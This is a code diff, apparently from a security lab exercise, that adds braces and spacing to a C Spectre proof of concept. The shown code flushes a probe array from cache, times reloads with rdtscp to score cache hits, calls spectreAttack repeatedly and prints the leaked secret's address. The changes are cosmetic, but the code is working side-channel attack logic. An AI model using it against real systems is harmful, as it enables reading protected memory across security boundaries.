@@ -32,11 +32,15 @@ void flushSideChannel()
 
   // Write to array to bring it to RAM to prevent Copy-on-write
   for (i = 0; i < 256; i++)
+  {
     array[i * 4096 + DELTA] = 1;
+  }
 
   // Flush the values of the array from cache
   for (i = 0; i < 256; i++)
+  {
     _mm_clflush(&array[i * 4096 + DELTA]);
+  }
 }
 
 void reloadSideChannelImproved()
@@ -51,8 +55,11 @@ void reloadSideChannelImproved()
     time1 = __rdtscp(&junk);
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
+
     if (time2 <= CACHE_HIT_THRESHOLD)
+    {
       scores[i]++; /* if cache hit, add 1 for this value */
+    }
   }
 }
 
@@ -97,7 +104,9 @@ int main()
   flushSideChannel();
 
   for (i = 0; i < 256; i++)
+  {
     scores[i] = 0;
+  }
   for (i = 0; i < 1000; i++)
   {
     spectreAttack(larger_x);
@@ -108,7 +117,9 @@ int main()
   for (i = 1; i < 256; i++)
   {
     if (scores[max] < scores[i])
+    {
       max = i;
+    }
   }
 
   printf("Reading secret value at %p\n", (void *)larger_x);
